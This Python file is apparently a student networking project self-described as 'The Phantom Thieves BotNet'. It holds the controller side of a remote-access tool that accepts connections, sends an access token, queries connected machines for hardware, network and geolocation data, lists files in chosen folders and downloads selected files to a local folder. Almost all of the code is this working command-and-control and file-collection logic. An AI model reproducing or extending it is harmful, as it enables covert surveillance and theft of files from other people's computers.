#  Progetto Reti - The Phantom Thieves of Hearts (Take your time)
#
#
#
#
#                                                                     ,,,,,,,,,,,
#                                                              ,,,,,,,,,,,,
#                                                         ,,,,,,,,,,,,, ,,,   ,
#                                                    ,,,,,,,,,,,,,,, ,, ,,,    ,
#                                                 ,,,,,,,,,,,,,,,,,,,,, ,,,, , ,
#                                              ,,,,,,,,,,,,,,,,,,,,,,,,, ,,,   ,.
#                                             ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ,,,
#                                           ,,,,,,,,,,,,,   ,,,,,,,,,,,,, ,,,,  ,
#                                           ,,,,,,,,,         ,,,,,,,,,,,, ,,,  ,,
#                                                            , ,,,,,,,,,,,,.,,,  ,
#                                                             ,,,,,,,,,,,,,,,,,, ,,                        @
#                                                               , ,,,,,,,,,,,,,,           ,
#                                                                , ,,,,,,,,,,, ,      ,,                      @@
#                                                                   ,,,,,,,,,,  ,, ,,        @@       ,     @
#                                                                    ,,,,,,, ,,,,,,      &@@   ,,,,,,,,   @@
#                                                                      ,, ,,,,,,,      @@@@ ,,,, @ ,,,  @@@
#                                                                     ,,,,,,, ,      @@@@@@,,,,@@ ,,,@@@@@
#                                                                 ,,,,,,,,,, ,    ,, @@@@@@@,, @@@@@@@@@(
#                                                                  ,,,,,,,,,,  @,,,,,@@@@@@@@ ,,,,,
#                                                                   ,,,,,,,,  @ ,,,,&@@@@@@ ,,,,,,,
#                                                       ,,,,,,       ,,,, ,  @@@@ @@@@@@@@@ ,, ,,,
#                                                  ,,,,,,,,,,,,       , ,,, @@@@@@@@@@@@@@@@@ ,,,
#                                                ,,,,,,,,,,,,,,,,      , , @@@@@@@@@@@@@@@  ,,,
#                                               ,,,,,,,,,,,,,,,,,,,,,,, ,,,,@@@@@@@@@ ,,,,,,,,
#                                                ,,,,,,,,,,,,,,,,,,,,  ,,,.@@@@@@@@@    @ ,,
#                                                   ,,,,,,,,, ,,,    ,,,,,@@@@@.@@@@@@, ,,
#                                                              @@@@   .,,, ,,,,,,,,,,,,,
#                                                                 @@   ,,,,,,,,,,,,,,,
#
#
#
#
#  Autori:
#  ALEX CIACCIARELLA    N86003179
#  STEFANO DE FENZA    N86003446
#  ELVINO BUONANNO      N86003302
#  GUGLIELMO DE BIASIO     N86003216
#
import json
# default imports
import logging
import os
import signal
import socket
import time

# downloaded imports
import pyfiglet
from hurry.filesize import size

# attributi globali
Port = 58131                                                                             #____________
IpAddr = "192.168.1.154"#da far diventare statico se il professore ci da l'ip #        |192.168.1.75|
s = socket.socket()                                                                    # ------------
access_token = '0ffd6eb3150512'


def cosaFare():
    print("Cosa vuoi fare ora?")
    print("1)Ottieni Informazioni complete sul sistema sul sistema")
    print("2)Cerca File nel sistema")
    print("3)Chiudi la connessione")


def MenuClient():
    print("What do you want to do?")
    print("1)Get All Information about the system")
    print("2)Get Cpu Information")
    print("3)Get Ram Information")
    print("4)Get current Disk Information")
    print("5)Get Network Information")
    print("6)Get Geolocalization Information")
    print("7)Scan Files on client pc")
    print("8)Close Connection")

    resp = ''
    try:
        resp = int(input())
    except ValueError:
        print("Inserisci un numero valido")
    if 0 < resp < 9:
        return resp
    else:
        print("Inserisci un numero valido")


def cosaFareInizialmente(client) -> bool:
    response = MenuClient()
    if response == 7:
        client.send("7".encode())
        retrievalOperations(client)
    elif response == 8:
        pass
    else:
        # inviare normalmente le richieste
        OttieniInformazioni(client, response)

    if CloseConnection():
        client.send("quit".encode())
        time.sleep(1)
        client.shutdown(socket.SHUT_RDWR)
        client.close()
        return False
    else:
        return True


def retrievalOperations(client):
    chosen_path = scanPaths(client)
    client.send(chosen_path.encode("utf-8"))
    found_files, files_by_number = downloadMenu(client)
    if found_files == None or files_by_number == None:
        client.send("quit".encode("utf-8"))
        return
    else:
        client.send("not quit".encode("utf-8"))
    time.sleep(5)
    client.send(chosen_path.encode("utf-8"))
    time.sleep(5)#afterrecvall
    client.sendall(files_by_number)
    downloaderFunction(client)


def OttieniInformazioni(client, res):
    client.send(str(res).encode())
    print("Message Sent!")

    message = client.recv(8192).decode()
    print("Message received!")
    print(message)

    time.sleep(1)  # riga finale prima dell'ultima operazione


def CloseConnection():
    print("\nDo you Want To close the connection?")
    print("1)Yes")
    print("2)No")

    response = input()
    if response == "2":
        return False
    elif response == "1":
        return True
    else:
        return CloseConnection()


def CreaSocket():
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Socket Successfully created")
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as e:
        s.close()
        logging.error(e)


def CreaBind():
    global s
    try:
        s.bind((IpAddr, Port))
        print("Bind Creato")
    except socket.error as e:
        s.close()
        logging.error(e)


def Listen():
    global s
    try:
        print("Now in listening...")
        client, address = s.accept()
        print(f"Connessione accettata con {client.getpeername()}")
        time.sleep(5)
        client.send(str(access_token).encode())
        return client, address
    except Exception as e:
        print("Errore nel listen")
        s.close()
        logging.error(e)


def ConnectionMenu() -> bool:
    esci = True
    while esci:
        print("Do you want to accept other connections?")
        print("1)Yes")
        print("2)No")
        risposta = input()
        if risposta == '1':
            return False
        elif risposta == '2':
            return True
        else:
            pass

def main():
    esisteclient = False
    connessioneclient = True

    CreaSocket()
    CreaBind()
    s.listen(5)
    while not esisteclient:
        client, _ = Listen()
        connessioneclient = True
        while connessioneclient:
            connessioneclient = cosaFareInizialmente(client)
        esisteclient = ConnectionMenu()
    s.close()


def scanPaths(client_object):
    path_dict = recvall(client_object).decode()
    path_dict = json.loads(path_dict)

    print("Scegliere quale dei seguenti percorsi scannerizzare:")
    for i in path_dict:
        print(f"{i}:{path_dict[i]}")
    choice = int(input())

    path = list(path_dict.values())[choice - 1]

    return path


def calculate_range_number(start: int, end: int, list: list):
    for i in range(start, end + 1):
        if not i in list:
            list.append(i)


def is_str_correct(str, nof):
    if str[len(str) - 1] == "-" or str[len(str) - 1] == ",":
        return False

    for i in range(0, len(str)):
        if i == len(str) - 1 and (str[i] != ',' or str[i] != '-'):
            if 0 <= int(str[i]) <= nof:
                return True
            else:
                return False
        if (str[i] == str[i + 1] and (str[i] == ',' or str[i] == '-')):
            return False
        if (str[i] == ',' and str[i + 1] == "-"):
            return False
    return False


def filteredList(number_of_files: int):
    single_file_index = []
    esci = False
    while not esci:
        rawList = input()
        if is_str_correct(rawList, number_of_files):
            first_split_str = rawList.split(",")
            for i in first_split_str:
                if not '-' in i:
                    if not int(i) in single_file_index and (0 < int(i) <= number_of_files + 1):
                        single_file_index.append(int(i))

                else:
                    range = i.split('-')
                    calculate_range_number(int(range[0]), int(range[len(range) - 1]), single_file_index)
            return single_file_index
        else:
            print("La stringa non è valida... Reinseriscila tra 1 secondo")
            time.sleep(1)


def downloadMenu(client_object):
    found_files = recvall(client_object)
    found_files = found_files.decode()
    found_files = json.loads(found_files)
    found_files_number = []
    counter = 1
    index = 0
    for i in found_files:
        found_files_number.insert(index, f"{counter}) {found_files[index]}")
        counter += 1
        index += 1

    if len(found_files) != 0:
        print("File trovati:\n")
        print(found_files_number)

        print("\nVuoi scaricare qualcosa? \n1) Sì\n2) No")

        choice = int(input())

        if choice == 1:
            print("Indicare con i numeri quali file scaricare. "
                  "Per scaricare file consecutivamente scrivere '1-10' mentre per più file specifici, separarli con la virgola '1,3,5'.\n")

            file_list = filteredList(len(found_files))

            return json.dumps(found_files, indent=4).encode("utf-8"), json.dumps(file_list).encode("utf-8")
        else:
            return None, None
    else:
        print("Non sono presenti file in questa cartella")
        return None, None


def downloaderFunction(client_object):
    number_of_files = client_object.recv(8192).decode("utf-8")
    number_of_files = int(number_of_files)
    for i in range(0, number_of_files):
        file_size = client_object.recv(1024).decode("utf-8")
        client_object.send("procedi".encode("utf-8"))
        file_name = client_object.recv(4096).decode("utf-8", "ignore")
        file_name = os.path.basename(file_name)
        client_object.send("ho ricevuto il file-name".encode("utf-8"))
        path = "./downloaded_files"
        if not os.path.exists(path):
            os.mkdir(path=path)

        with open(os.path.join(path, file_name), 'wb') as file_to_write:
            data = recvall2(client_object, int(file_size))
            file_to_write.write(data)

        client_object.send("Ho finito di scaricare, manda altro".encode("utf-8"))


def recvall(sock):
    BUFF_SIZE = 4096
    data = b''
    while True:
        time.sleep(2)
        part = sock.recv(BUFF_SIZE)
        data += part
        print(f"Ho letto {len(data)} byte")
        if len(part) < BUFF_SIZE:
            break  # 0 bit da scaricare o end of file
    return data


def recvall2(sock, file_size: int):
    BUFF_SIZE = 4096  # byte
    n = 0
    data = b''
    while len(data) < file_size:
        time.sleep(1.5)
        n += 1
        if file_size > 4096:
            print(f"\rScarico {size(n * BUFF_SIZE)}/{size(file_size)} parts downloaded", end='')
        part = sock.recv(BUFF_SIZE)
        data += part
        #if len(part) < BUFF_SIZE:
            #break  # 0 bit da scaricare o end of file
    return data


def signal_handler(signal, frame):
    print("Keyboard Interrupt received: closing connection...")
    s.close()
    exit(0)


def groupText():
    print(pyfiglet.figlet_format("The Phantom Thieves BotNet"))


def Phantom():
    print("""                                                                                                                                                      


                                                                   ,,,,,,,,,,,                                                                        
                                                            ,,,,,,,,,,,,                                                                              
                                                       ,,,,,,,,,,,,, ,,,   ,                                                                          
                                                  ,,,,,,,,,,,,,,, ,, ,,,    ,                                                                         
                                               ,,,,,,,,,,,,,,,,,,,,, ,,,, , ,                                                                         
                                            ,,,,,,,,,,,,,,,,,,,,,,,,, ,,,   ,.                                                                        
                                           ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ,,,                                                                        
                                         ,,,,,,,,,,,,,   ,,,,,,,,,,,,, ,,,,  ,                                                                        
                                         ,,,,,,,,,         ,,,,,,,,,,,, ,,,  ,,                                                                       
                                                          , ,,,,,,,,,,,,.,,,  ,                                                                       
                                                           ,,,,,,,,,,,,,,,,,, ,,                        @                                             
                                                             , ,,,,,,,,,,,,,,           ,                                                             
                                                              , ,,,,,,,,,,, ,      ,,                      @@                                         
                                                                 ,,,,,,,,,,  ,, ,,        @@       ,     @                                            
                                                                  ,,,,,,, ,,,,,,      &@@   ,,,,,,,,   @@                                             
                                                                    ,, ,,,,,,,      @@@@ ,,,, @ ,,,  @@@                                              
                                                                   ,,,,,,, ,      @@@@@@,,,,@@ ,,,@@@@@                                               
                                                               ,,,,,,,,,, ,    ,, @@@@@@@,, @@@@@@@@@(                                                
                                                                ,,,,,,,,,,  @,,,,,@@@@@@@@ ,,,,,                                                      
                                                                 ,,,,,,,,  @ ,,,,&@@@@@@ ,,,,,,,                                                      
                                                     ,,,,,,       ,,,, ,  @@@@ @@@@@@@@@ ,, ,,,                                                       
                                                ,,,,,,,,,,,,       , ,,, @@@@@@@@@@@@@@@@@ ,,,                                                        
                                              ,,,,,,,,,,,,,,,,      , , @@@@@@@@@@@@@@@  ,,,                                                          
                                             ,,,,,,,,,,,,,,,,,,,,,,, ,,,,@@@@@@@@@ ,,,,,,,,                                                           
                                              ,,,,,,,,,,,,,,,,,,,,  ,,,.@@@@@@@@@    @ ,,                                                             
                                                 ,,,,,,,,, ,,,    ,,,,,@@@@@.@@@@@@, ,,                                                               
                                                            @@@@   .,,, ,,,,,,,,,,,,,                                                                 
                                                               @@   ,,,,,,,,,,,,,,,                                                                   


                                                                                                                                                      """)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    groupText()
    Phantom()
    main()
